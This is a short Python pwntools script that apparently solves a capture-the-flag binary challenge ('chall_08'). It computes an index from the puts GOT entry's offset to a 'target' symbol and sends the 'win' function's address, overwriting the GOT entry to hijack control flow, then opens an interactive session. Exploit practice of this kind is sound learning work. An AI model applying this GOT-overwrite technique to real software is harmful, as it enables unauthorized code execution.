from pwn import *
binary = context.binary = ELF('./chall_08')
p = process(binary.path)
p.sendline(str(binary.sym.win))
p.sendline(str((binary.got.puts - binary.sym.target)// 8))
p.interactive()

